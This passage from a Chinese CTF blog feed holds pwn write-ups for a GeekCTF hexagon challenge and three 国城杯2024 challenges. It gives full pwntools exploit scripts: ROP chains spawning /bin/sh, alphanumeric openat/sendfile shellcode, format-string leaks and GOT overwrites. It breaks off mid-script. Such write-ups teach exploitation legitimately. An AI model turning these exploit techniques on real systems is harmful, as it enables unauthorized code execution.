class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process([<span class="string">&#x27;qemu-hexagon&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>, <span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;in_asm,exec,cpu,nochain&#x27;</span>, <span class="string">&#x27;-singlestep&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;-dfilter&#x27;</span>, <span class="string">&#x27;0x20400+0xc0&#x27;</span>, <span class="string">&#x27;-strace&#x27;</span>, <span class="string">&#x27;-D&#x27;</span>, <span class="string">&#x27;./log&#x27;</span>, <span class="string">&#x27;./chall&#x27;</span>])</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack = <span class="number">0x4080ebe0</span></span><br><span class="line">libc_base = <span class="number">0x3FED0000</span></span><br><span class="line">gadget1 = <span class="number">0x204b4</span>  <span class="comment"># &#123; r0 = memw(fp + #var_8) &#125; &#123; dealloc_return &#125;</span></span><br><span class="line">ret = <span class="number">0x2041c</span>  <span class="comment"># &#123; dealloc_return &#125;</span></span><br><span class="line"><span class="comment"># success(hex(libc_base+0x0012279))</span></span><br><span class="line"></span><br><span class="line">payload = p32(stack + <span class="number">0x10</span>)</span><br><span class="line">payload += p32(gadget1)</span><br><span class="line">payload += p32(libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))) + p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">payload += p32(stack)+p32(ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>从下载附件到打通题目再到写完文章，一天过去了……之前没有试过这么少资料能参考的情况，网上的wp甚至只能找到<a href="https://deepunk.icu/GeekCTF2024wp/">DeePunk师傅的</a>（orz师傅tql），尽管是一道简单的栈溢出，却也要花这么多的时间才能较为完整地学习下来基础知识。实际做下来其实发现并没有那么困难，很多知识都可以迁移和类比，大概时间都花在了搭环境上。无论如何，能坚持写完这篇文章感觉真是不容易。希望我明天、后天、大后天也能有这么饱满的热情去学习新知识。</p><p>2025年的GeekCTF，会赢吗？</p><h2 id="深入探究"><a href="#深入探究" class="headerlink" title="深入探究"></a>深入探究</h2><p>更新：2024.12.13</p><p>临近期末，但是一点都不想准备。有点和这个hexagon杠上了，然后发现这个动态链接库中有ogg利用的可能性。</p><p>我们在IDA中搜索&#x2F;bin&#x2F;sh，可以看到有三个函数引用到这个字符串。以system函数举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:000BBA70                 &#123; r3 = memw(fp + #var_42C) &#125;</span><br><span class="line">.text:000BBA74                 &#123; r0 = add(pc, ##aSh@pcrel) &#125; // &quot;sh&quot;</span><br><span class="line">.text:000BBA7C                 &#123; memw(fp + #var_420) = r0 &#125;</span><br><span class="line">.text:000BBA80                 &#123; r0 = add(pc, ##aC_0@pcrel) &#125; // &quot;-c&quot;</span><br><span class="line">.text:000BBA88                 &#123; memw(fp + #var_41C) = r0 &#125;</span><br><span class="line">.text:000BBA8C                 &#123; r0 = memw(fp + #var_10) &#125;</span><br><span class="line">.text:000BBA90                 &#123; memw(fp + #var_418) = r0 &#125;</span><br><span class="line">.text:000BBA94                 &#123; r2 = #0 &#125;</span><br><span class="line">.text:000BBA98                 &#123; memw(fp + #var_414) = r2 &#125;</span><br><span class="line">.text:000BBA9C                 &#123; r0 = add(pc, ##_GLOBAL_OFFSET_TABLE_@pcrel) &#125;</span><br><span class="line">.text:000BBAA4                 &#123; r0 = memw(r0 + ##-0x102E8) &#125;</span><br><span class="line">.text:000BBAAC                 &#123; r5 = memw(r0) &#125;</span><br><span class="line">.text:000BBAB0                 &#123; r1 = add(pc, ##aBinSh@pcrel) &#125; // &quot;/bin/sh&quot;</span><br><span class="line">.text:000BBAB8                 &#123; r0 = add(fp, #-0x14) &#125;</span><br><span class="line">.text:000BBABC                 &#123; r4 = add(fp, #-0x420) &#125;</span><br><span class="line">.text:000BBAC0                 &#123; call posix_spawn &#125;</span><br></pre></td></tr></table></figure><p>这里取了一小部分，也就是找到的类似于ogg的位置。实际上正常system执行，会从r0寄存器接受函数参数，也就是我们想执行的命令。这个命令的地址会被储存到fp-0x10的位置。通过上面的汇编我们也不难发现，这里最后执行的是<code>posix_spawn</code>函数，这个函数的签名如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">posix_spawn</span><span class="params">(<span class="type">pid_t</span> *<span class="keyword">restrict</span> pid, <span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> path, <span class="type">const</span> <span class="type">posix_spawn_file_actions_t</span> *file_actions, <span class="type">const</span> <span class="type">posix_spawnattr_t</span> *<span class="keyword">restrict</span> attrp, <span class="type">char</span> *<span class="type">const</span> argv[<span class="keyword">restrict</span>], <span class="type">char</span> *<span class="type">const</span> envp[<span class="keyword">restrict</span>])</span>;</span><br></pre></td></tr></table></figure><ul><li><code>pid</code>: 指向存储新进程 ID 的指针。</li><li><code>path</code>: 要执行的程序的路径。</li><li><code>file_actions</code>: 文件操作对象，用于指定子进程的文件描述符操作。可以是 <code>NULL</code>。</li><li><code>attrp</code>: 进程属性对象，用于指定子进程的调度和信号处理等属性。可以是 <code>NULL</code>。</li><li><code>argv</code>: 程序的参数列表（类似 <code>exec</code> 系列函数）。</li><li><code>envp</code>: 环境变量列表（类似 <code>exec</code> 系列函数）。</li></ul><p>第五个参数是我们要关注的，这个参数由r4寄存器传参。在上面的ogg中，r4被赋值为fp-0x420。其中fp-0x418处的值来自于fp-0x10。即，我们只要将传入的命令的储存地址，放到fp-0x10的位置上，这个ogg就能成功生效执行一个shell。</p><p>因此这道题的payload可以写成这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;sh\x00\x00&#x27;</span>+p32(stack)*(<span class="number">0x100</span>//<span class="number">4</span>-<span class="number">1</span>) + \</span><br><span class="line">    p32(stack+<span class="number">0x100</span>)+p32(libc_base+<span class="number">0xBBA70</span>)</span><br></pre></td></tr></table></figure><p>不需要任何其他的gadget和寄存器操作。但是不同于glibc的ogg，这里利用还是需要传入命令参数的。换个角度想，我们可以利用这一点做到RCE。</p>]]></content>
    
    
    <summary type="html">非常好架构，使我的IDA旋转</summary>
    
    
    
    <category term="hexagon" scheme="https://c-lby.top/categories/hexagon/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
    <category term="hexagon" scheme="https://c-lby.top/tags/hexagon/"/>
    
  </entry>
  
  <entry>
    <title>『国城杯2024』PWN WP</title>
    <link href="https://c-lby.top/2024/2024GCBCTF-wp/"/>
    <id>https://c-lby.top/2024/2024GCBCTF-wp/</id>
    <published>2024-12-09T03:33:31.000Z</published>
    <updated>2024-12-09T08:16:58.984Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Alpha-Shell"><a href="#Alpha-Shell" class="headerlink" title="Alpha_Shell"></a>Alpha_Shell</h2><p>这题应该是除了签到外全场第一个一血，我抢了个三血。纯血可见字符shellcode题。main函数了塞了一些花指令（jn+jnz），没法直接反编译，部分IDA版本不受影响，我当时用8.3是需要nop掉之后，再create function才能正常反编译。</p><p>开了沙箱：<img src="https://c-lby.top/images/2024GCBCTF/%E6%B2%99%E7%AE%B1.png" alt="沙箱"></p><p>考虑openat+sendfile</p><p>可以注意到程序在执行shellcode的时候是基于rdx，所以使用ae64生成的时候要改参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;    </span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    push SYS_openat</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi, 3</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x100</span></span><br><span class="line"><span class="string">    push SYS_sendfile</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">payload = asm(sc, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode = AE64().encode(payload, <span class="string">&#x27;rdx&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.send(shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="Offensive-Security"><a href="#Offensive-Security" class="headerlink" title="Offensive_Security"></a>Offensive_Security</h2><h3 id="前段分析"><a href="#前段分析" class="headerlink" title="前段分析"></a>前段分析</h3><p>首先题目主程序中的函数全部来自动态链接库，附件给出了额外自定义的.so，我们真正需要分析的是这个动态库。login函数贴脸fmt漏洞，可以泄露出登录密码。这里有两种做法，一个是用%s泄露密码，一个是用%ln覆写密码。</p><p>接下来程序开了个多线程，一个可以修改认证密码，一个需要你写正确的认证密码。没有线程互斥锁，二分之一几率修改认证密码的线程会先出现，然后再输入和刚才一样的认证密码就行。</p><h3 id="后段分析"><a href="#后段分析" class="headerlink" title="后段分析"></a>后段分析</h3><h4 id="第一种解法"><a href="#第一种解法" class="headerlink" title="第一种解法"></a>第一种解法</h4><p>接下来就进入到了最难蚌的地方。我们现在有一个很大的栈溢出，但是没有libc地址。这里先讲第一种做法，注意到主程序没开PIE，其中调用了printer函数，这个函数可以打开文件并输出文件内容，不难想到只要给rdi传入”flag”字符串地址就能打印flag了。但问题在于没法调用read。注意到主程序给了一些gadget，考虑出题人想要我们利用这些gadget来构造flag字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040064E fungadgets:</span><br><span class="line">.text:000000000040064E                 xlat</span><br><span class="line">.text:000000000040064F                 retn</span><br><span class="line">.text:0000000000400650 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400650                 pop     rdx</span><br><span class="line">.text:0000000000400651                 pop     rcx</span><br><span class="line">.text:0000000000400652                 add     rcx, 0D093h</span><br><span class="line">.text:0000000000400659                 bextr   rbx, rcx, rdx</span><br><span class="line">.text:000000000040065E                 retn</span><br><span class="line">.text:000000000040065F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040065F                 stosb</span><br><span class="line">.text:0000000000400660                 retn</span><br><span class="line">.text:0000000000400661 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400661                 pop     rdi</span><br><span class="line">.text:0000000000400662                 retn</span><br><span class="line">.text:0000000000400662 _text           ends</span><br></pre></td></tr></table></figure><p>这里有些很冷门的汇编指令：</p><ul><li>xlat(Translate Byte to AL)：在x86_64下的作用是查找[bx+al]的内容，并将其储存在al中</li><li>bextr(Bit Field Extract)：bextr   rbx, rcx, rdx的作用是将rcx+dh开始的dl长度的数据，放到rbx中。注意不是取[rcx+dh]，而是rcx寄存器本身的内容。</li><li>stosb(Store String Byte)：将al寄存器中的数据储存到[rdi]当中，并rdi++或–（取决与DF标志寄存器）</li></ul><p>程序中不存在完整的“flag”字符串，那么我们需要逐个字节去寻找字符，并将字符连续放到bss段当中。分为以下几步：</p><ol><li>查找某个字符在主程序的地址，将这个地址减去0xD093后传入rcx</li><li>将rdx设置为0x4000，意味着取这个rcx的内容</li><li>执行bextr，此时rbx等于rcx</li><li>执行xlat，此时rax的值是第一步查找到的字符</li><li>将rdi赋值为bss段地址</li><li>执行stosb，此时rax中的字符就会被传入到bss地址中</li></ol><p>这里需要注意几个问题，我们需要连续查找六个字符（.&#x2F;flag），但是途中rax寄存器会因为上一个字符而残留一些数据，会影响到下一个字符的xlat指令执行。因为在第二个字符开始，我们传入rbx的地址要考虑到上一个字符的影响。</p><h5 id="动调分析"><a href="#动调分析" class="headerlink" title="动调分析"></a>动调分析</h5><p>下面通过动调举例看看执行情况。payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi)+p64(bss)+p64(bextr) + \</span><br><span class="line">    p64(<span class="number">0x4000</span>)+p64(<span class="number">0x3F2F83</span>)+p64(xlat)+p64(stosb)<span class="comment">#0x3F2F83=0x400016-0xd093</span></span><br></pre></td></tr></table></figure><p>这个程序动调需要注意多线程问题，pwndbg启动之后虽然程序停在等待输入，但是当前他可能在另一个线程，不在read的线程。这时候需要通过<code>thread 2</code>切换到2线程，这样断点之类的才不会飞。进入到rop链，此时rcx被赋值为0x400016</p><p><img src="https://c-lby.top/images/2024GCBCTF/rcx%E8%A2%AB%E8%B5%8B%E5%80%BC.png" alt="rcx被赋值"></p><p>bextr执行过后，rbx被赋值。现在我们要查找的字符就是<code>.</code>所以能看到该地址指向的第一个字符就是<code>.</code></p><p><img src="https://c-lby.top/images/2024GCBCTF/rbx%E8%A2%AB%E8%B5%8B%E5%80%BC.png" alt="rbx被赋值"></p><p>xlat执行过后：</p><p><img src="https://c-lby.top/images/2024GCBCTF/xlat%E6%89%A7%E8%A1%8C%E8%BF%87%E5%90%8E.png" alt="xlat执行过后"></p><p>可以看到原本rax是0的，现在是0x2e。执行完stosb，这个0x2e就会进到0x600300中。后面的字符以此类推。需要注意的就是，这个rax不会自己置零，所以下一个字符的地址不仅要减0xd093，还要减去0x2e，以此类推。</p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line"><span class="comment"># r = remote(&quot;125.70.243.22&quot;, 31307)</span></span><br><span class="line">e = ELF(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.send(<span class="string">b&#x27;%7$sflag&#x27;</span>+p64(<span class="number">0x6002B0</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Welcome, \n&#x27;</span>)</span><br><span class="line">password = r.recv(<span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line">r.recv()</span><br><span class="line">r.send(password)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;12345&#x27;</span>)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"><span class="comment"># gdb.attach(r, &quot;b shell&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;12345&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x600300</span></span><br><span class="line">xlat = <span class="number">0x40064E</span></span><br><span class="line">stosb = <span class="number">0x40065F</span></span><br><span class="line">rdi = <span class="number">0x400661</span></span><br><span class="line">bextr = <span class="number">0x400650</span></span><br><span class="line">printer = <span class="number">0x400647</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi)+p64(bss)+p64(bextr) + \</span><br><span class="line">    p64(<span class="number">0x4000</span>)+p64(<span class="number">0x3F2F83</span>)+p64(xlat)+p64(stosb)</span><br><span class="line">payload += p64(bextr)+p64(<span class="number">0x4000</span>)+p64(<span class="number">0x400006</span> -</span><br><span class="line">                                      <span class="number">0xD093</span>-<span class="number">0x2e</span>)+p64(xlat)+p64(stosb)</span><br><span class="line">payload += p64(bextr)+p64(<span class="number">0x04000</span>)+p64(<span class="number">0x40023f</span> -</span><br><span class="line">                                       <span class="number">0xD093</span>-<span class="number">0x2f</span>)+p64(xlat)+p64(stosb)</span><br><span class="line">payload += p64(bextr)+p64(<span class="number">0x04000</span>)+p64(<span class="number">0x400001</span> -</span><br><span class="line">                                       <span class="number">0xD093</span>-<span class="number">0x66</span>)+p64(xlat)+p64(stosb)</span><br><span class="line">payload += p64(bextr)+p64(<span class="number">0x04000</span>)+p64(<span class="number">0x4001f8</span> -</span><br><span class="line">                                       <span class="number">0xD093</span>-<span class="number">0x6c</span>)+p64(xlat)+p64(stosb)</span><br><span class="line">payload += p64(bextr)+p64(<span class="number">0x04000</span>)+p64(<span class="number">0x4001ea</span> -</span><br><span class="line">                                       <span class="number">0xD093</span>-<span class="number">0x61</span>)+p64(xlat)+p64(stosb)</span><br><span class="line">payload += p64(rdi)+p64(bss)+p64(printer)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>这个exp里的地址都是手搜出来的。也可以用官方wp的写法，利用<code>next(elf.search(bytes([char])))</code>的方法自动搜索字符地址，一把梭。</p><h4 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h4><p>还记得前面的16字节fmt吗？如果用泄露密码的方式来绕过login，那么我们还能多出来4个字节的位置，可以拿来泄露libc地址。这样的话栈溢出就直接getshell就好了，不知道是不是非预期解。当然前提是在4个字节里能够泄露得出来，这道题刚好可以，在寄存器里有一个libc地址。</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line"><span class="comment"># r = remote(&quot;125.70.243.22&quot;, 31307)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.send(<span class="string">b&#x27;%3$p%7$s&#x27;</span>+p64(<span class="number">0x6002B0</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Welcome, \n&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(r.recv(<span class="number">14</span>), <span class="number">16</span>)-<span class="number">0x114887</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">password = r.recv(<span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line">r.recv()</span><br><span class="line">r.send(password)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;12345&#x27;</span>)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;12345&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x400661</span></span><br><span class="line">ret = <span class="number">0x400462</span></span><br><span class="line">system = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="beverage-store"><a href="#beverage-store" class="headerlink" title="beverage store"></a>beverage store</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>checkvip函数随机数绕过老生常谈，给了libc2.35，直接ctypes刷脸就行。不过这道题甚至不需要刷脸，可以注意到buf可以输入16个字节，随后被复制到了name变量，在bss段，会把seed也一起覆盖了，因此可以直接固定种子，不需要调用time函数。</p><p>buy函数没有限制v0不能小于0，因此利用read，可以修改got表（没开relro和PIE保护）。注意到vuln函数有个<code>printf(&quot;/bin/sh&quot;)</code>，考虑将printf的got表劫持为system。</p><p>在这之前我们需要先泄露libc地址，同样是利用got表，但是只有一次机会，所以要先想办法循环一下。考虑劫持exit为buy函数。</p><p>因此总体思路如下：</p><ol><li>劫持exit@got为buy函数</li><li>选择一个没被劫持但已解析的got地址泄露libc</li><li>劫持printf@got为system函数</li><li>劫持exit@got为vuln函数</li></ol><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">srand = libc.srand(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./pwn&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;125.70.243.22&quot;</span>,<span class="number">31382</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">1</span>)*<span class="number">2</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input yours id authentication code:&quot;</span>,<span class="built_in">str</span>(libc.rand()))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">4</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;which one to choose&quot;</span>)</span><br><span class="line">payload=p64(<span class="number">0x40133f</span>)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">5</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;which one to choose&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\xf0&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;succeed\n&quot;</span>)</span><br><span class="line">libcaddr=u64(p.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase=libcaddr-<span class="number">0x0815f0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcaddr&quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line">system=libcbase+<span class="number">0x050d70</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">7</span>))</span><br><span 